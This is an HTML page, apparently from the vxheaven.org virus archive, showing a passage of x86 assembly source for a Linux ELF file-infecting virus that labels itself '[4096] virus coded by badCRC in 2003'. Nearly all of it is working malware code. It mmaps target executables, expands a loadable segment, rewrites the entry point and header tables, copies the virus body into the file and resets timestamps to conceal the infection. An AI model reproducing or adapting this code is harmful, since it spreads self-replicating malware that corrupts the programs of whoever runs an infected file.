      <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span>               <span style="color: black; font-style: italic;">; loadable?</span>
      <span style="color: #00007f; font-weight: bold;">jnz</span>     busca_loadable
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">28h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; EAX = p_memsz</span>
      <span style="color: #00007f; font-weight: bold;">neg</span>     <span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0fh</span>
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>virus_len
      <span style="color: #00007f; font-weight: bold;">jb</span>      @close_file
&nbsp;
      <span style="color: #00007f; font-weight: bold;">movzx</span>   <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6ch</span>                        <span style="color: black; font-style: italic;">; sys_newfstat</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; EDI = original file size</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ch</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>                       <span style="color: black; font-style: italic;">; ECX = new file size</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5dh</span>                        <span style="color: black; font-style: italic;">; sys_ftruncate</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ebx</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">eax</span>                           <span style="color: black; font-style: italic;">; beginning of the file (0)</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ebx</span>                           <span style="color: black; font-style: italic;">; fd</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">eax</span>                           <span style="color: black; font-style: italic;">; MAP_SHARED (1)</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">03h</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">eax</span>                           <span style="color: black; font-style: italic;">; PROT_READ + PROT_WRITE (3)</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ecx</span>                           <span style="color: black; font-style: italic;">; map the whole file</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ebx</span>                           <span style="color: black; font-style: italic;">; 0</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5ah</span>                        <span style="color: black; font-style: italic;">; old_mmap</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">18h</span>                       <span style="color: black; font-style: italic;">; restore stack</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0fffff000h</span>                <span style="color: black; font-style: italic;">; error?</span>
      <span style="color: #00007f; font-weight: bold;">jbe</span>     map_ok
&nbsp;
      <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ebx</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>                       <span style="color: black; font-style: italic;">; ECX = original file size</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5dh</span>                        <span style="color: black; font-style: italic;">; sys_ftruncate</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">jmp</span>     restore_date
&nbsp;
@close_file<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">jmp</span>     close_file
&nbsp;
map_ok<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>                       <span style="color: black; font-style: italic;">; EBX = map address</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ecx</span>                           <span style="color: black; font-style: italic;">; stack new file size</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; p_filesz</span>
      <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">-</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; p_filesz + p_vaddr</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; e_entry</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>           <span style="color: black; font-style: italic;">; put new entry point</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>old_entry<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>     <span style="color: black; font-style: italic;">; save old</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">eax</span>                           <span style="color: black; font-style: italic;">; p_filesz</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">-</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; p_filesz + p_offset</span>
      <span style="color: #00007f; font-weight: bold;">movzx</span>   <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2ch</span><span style="color: black;">&#93;</span>            <span style="color: black; font-style: italic;">; e_phnum</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>           <span style="color: black; font-style: italic;">; new p_filesz</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>           <span style="color: black; font-style: italic;">; new p_memsz</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0ch</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">07h</span>            <span style="color: black; font-style: italic;">; PF_R + PF_W + PF_X</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">38h</span>                       <span style="color: black; font-style: italic;">; EDX = PHT offset + 4</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1000h</span>
&nbsp;
fix_PHT<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">jb</span>      next_entry_PHT
&nbsp;
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>               <span style="color: black; font-style: italic;">; fix this entry!</span>
&nbsp;
next_entry_PHT<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>                       <span style="color: black; font-style: italic;">; next entry in the PHT + 4</span>
      <span style="color: #00007f; font-weight: bold;">loop</span>    fix_PHT
&nbsp;
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span>           <span style="color: black; font-style: italic;">; e_shoff</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>           <span style="color: black; font-style: italic;">; fix e_shoff</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">30h</span><span style="color: black;">&#93;</span>             <span style="color: black; font-style: italic;">; e_shnum</span>
&nbsp;
fix_SHT<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">jb</span>      next_entry_SHT
&nbsp;
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>           <span style="color: black; font-style: italic;">; fix this entry!</span>
&nbsp;
next_entry_SHT<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">28h</span>                       <span style="color: black; font-style: italic;">; next entry in the SHT</span>
      <span style="color: #00007f; font-weight: bold;">loop</span>    fix_SHT
&nbsp;
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>                       <span style="color: black; font-style: italic;">; amount of bytes we are going</span>
                                            <span style="color: black; font-style: italic;">;to move</span>
      <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">edi</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">xadd</span>    <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">std</span>
      <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
      <span style="color: #00007f; font-weight: bold;">cld</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span>virus_len<span style="color: #339933;">/</span><span style="color: #ff0000;">4</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>_start<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #b00040;">movsd</span>                         <span style="color: black; font-style: italic;">; copy the virus!</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5bh</span>                        <span style="color: black; font-style: italic;">; sys_munmap</span>
      <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span>numinfect<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span>
&nbsp;
restore_date<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1eh</span>                        <span style="color: black; font-style: italic;">; sys_utime</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">258h</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">48h</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span>
&nbsp;
close_file<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06h</span>                        <span style="color: black; font-style: italic;">; sys_close</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">popad</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span>numinfect<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">03h</span>
      <span style="color: #00007f; font-weight: bold;">je</span>      nos_vamos
      <span style="color: #00007f; font-weight: bold;">jmp</span>     leer_entrada
&nbsp;
nos_vamos<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06h</span>                        <span style="color: black; font-style: italic;">; sys_close</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
      <span style="color: #00007f; font-weight: bold;">jmp</span>     salir
&nbsp;
&nbsp;
<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'.'</span>
&nbsp;
dot             <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'.'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>
old_entry       <span style="color: #0000ff; font-weight: bold;">dd</span> final
numinfect       <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0</span>
mensaje         <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'[4096] virus coded by badCRC in 2003'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0ah</span>
&nbsp;
len             <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>mensaje
&nbsp;
&nbsp;
<span style="color: black; font-style: italic;">; This is only for the first generation</span>
&nbsp;
final<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">01h</span>                       <span style="color: black; font-style: italic;">; sys_exit</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
&nbsp;
virus_len       <span style="color: #0000ff; font-weight: bold;">equ</span> final<span style="color: #339933;">-</span>_start
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=4096.zip">de</a><a href="/src_view.php?lang=en&amp;file=4096.zip">en</a><a href="/src_view.php?lang=es&amp;file=4096.zip">es</a><a href="/src_view.php?lang=it&amp;file=4096.zip">it</a><a href="/src_view.php?lang=fr&amp;file=4096.zip">fr</a><a href="/src_view.php?lang=pl&amp;file=4096.zip">pl</a><a href="/src_view.php?lang=ru&amp;file=4096.zip">ru</a><a href="/src_view.php?lang=ua&amp;file=4096.zip">ua</a></div>
</body>
</html>
